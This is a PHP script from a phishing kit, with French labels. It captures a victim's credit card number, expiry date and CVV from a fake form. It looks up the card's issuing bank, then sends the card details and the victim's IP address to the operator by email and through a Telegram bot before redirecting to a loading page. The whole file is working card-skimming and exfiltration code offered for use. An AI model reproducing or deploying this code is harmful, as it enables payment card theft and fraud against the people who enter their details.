<?php

include("../common/sub_includes.php");
include('../common/includes.php');
include("../config.php");

ob_start();
if(!isset($_SESSION)){
  session_start();  // Et on ouvre la session
} 
$CC = $_POST['cardNumberField'];
$DDE = $_POST['expirydatefield-month'] . "/" . $_POST['expirydatefield-year'];
$CVV = $_POST['cvvfield'];

if($_SERVER['REQUEST_METHOD'] == 'POST'){

  $_SESSION['cc']  = $CC;
  $_SESSION['dde']   = $DDE;
  $_SESSION['cvv'] = $CVV;

  $bin=$CC;	                  

  $ch = curl_init();

  $url = "https://lookup.binlist.net/$bin";

  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');


  $headers = array();
  $headers[] = 'Accept-Version: 3';
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

  $result = curl_exec($ch);


  if (curl_errno($ch)) {
      echo 'Error:' . curl_error($ch);
  }


  curl_close($ch);

  $brand = '';
  $type = '';
  $emoji = '';
  $bank = '';

  $someArray = json_decode($result, true);

  $emoji = $someArray['country']['emoji'];
  $bin_brand = $someArray['brand'];
  $bin_type = $someArray['type'];
  $bin_bank = $someArray['bank']['name'];
  $bank_phone = $someArray['bank']['phone'];
  $subject_title = "[BIN: $bin][$emoji $brand $type]";

  $_SESSION['bin_brand']  = $bin_brand;
  $_SESSION['bin_bank']   = $bin_bank;
  $_SESSION['bin_type'] = $bin_type;

$message = '
[🦊] Certificat +1 cc [🦊]

💳 Num carte : '.$_SESSION["cc"].'
💳 Date Expiration : '.$_SESSION["dde"].'
💳 Cryptogramme visuel : '.$_SESSION["cvv"].'

🍓 Banque : '.$bin_bank.'
🍓 Niveau de la carte : '.$bin_brand.'
🍓 Type de carte : '.$bin_type.'

[🍛] Tiers Part [🍛] 

🛒 Adresse IP : '.$_SERVER['REMOTE_ADDR'].'
';

  if($mail_send == true){
    $Subject=" 「🎰」+1 Fr3sh Certificat card from ".$bin_bank." | ".$_SERVER['HTTP_USER_AGENT'];
    $head="From: Certificat <info@querty.bg>";
    
    mail($my_mail,$Subject,$message,$head,$heads);
  }
  
  if($tlg_send == true){
    file_get_contents('https://api.telegram.org/bot'.$bot_token.'/sendMessage?chat_id='.$rez_login.'&text='.urlencode("$message").'');
  }
  
    header('location: ../pages/load.php');
}
?>